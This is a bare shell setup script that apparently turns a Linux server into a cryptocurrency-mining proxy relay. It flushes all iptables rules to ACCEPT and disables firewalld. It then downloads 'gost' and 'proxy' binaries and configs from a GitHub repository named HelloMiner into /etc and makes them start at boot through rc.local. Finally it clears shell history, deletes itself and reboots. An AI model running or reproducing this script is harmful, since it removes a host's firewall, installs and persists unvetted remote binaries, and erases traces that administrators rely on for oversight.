yum install wget iptables-services iptables psmisc -y
iptables-save | awk '/^[*]/ { print $1 } 
                     /^:[A-Z]+ [^-]/ { print $1 " ACCEPT" ; }
                     /COMMIT/ { print $0; }' | iptables-restore
iptables -F
iptables -X
iptables -P INPUT ACCEPT   
iptables -P OUTPUT ACCEPT
service iptables save
systemctl enable iptables.service
systemctl disable firewalld
systemctl disable firewalld.service
cd /etc
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/gost -O gost
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/proxy -O proxy
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/config1 -O config1
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/config2 -O config2
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/config3 -O config3
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige1 -O confige1
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige2 -O confige2
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige3 -O confige3
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige4 -O confige4
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige5 -O confige5
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige6 -O confige6
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige7 -O confige7
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige8 -O confige8
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige1t -O confige1t
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige2t -O confige2t
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige3t -O confige3t
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige4t -O confige4t
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige5t -O confige5t
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige6t -O confige6t
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige7t -O confige7t
wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/confige8t -O confige8t
chmod +x gost
chmod +x proxy
chmod +x /etc/rc.d/rc.local
echo 'cd /etc'>>/etc/rc.d/rc.local
echo 'nohup ./gost -L=relay+mwss://:400/127.0.0.1:2000 -L=relay+mwss://:401/127.0.0.1:2001 -L=relay+mwss://:402/127.0.0.1:2002  -L=relay+mwss://:500/127.0.0.1:1010   -L=relay+mwss://:507/127.0.0.1:1017   -L=relay+mwss://:501/127.0.0.1:1011   -L=relay+mwss://:502/127.0.0.1:1012   -L=relay+mwss://:503/127.0.0.1:1013   -L=relay+mwss://:504/127.0.0.1:1014   -L=relay+mwss://:505/127.0.0.1:1015   -L=relay+mwss://:506/127.0.0.1:1016 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf config1 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf config2 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf config3 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige1 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige2 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige3 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige4 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige5 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige6 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige7 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige8 >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige1t >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige2t >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige3t >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige4t >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige5t >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige6t >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige7t >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'nohup ./proxy -conf confige8t >/dev/null 2>&1 &'>>/etc/rc.d/rc.local
echo 'history -c'>>/etc/rc.d/rc.local
echo 'cd ~'>>/etc/rc.d/rc.local
echo 'rm -f setup.sh'>>/etc/rc.d/rc.local
cd ~
rm -f setup.sh
reboot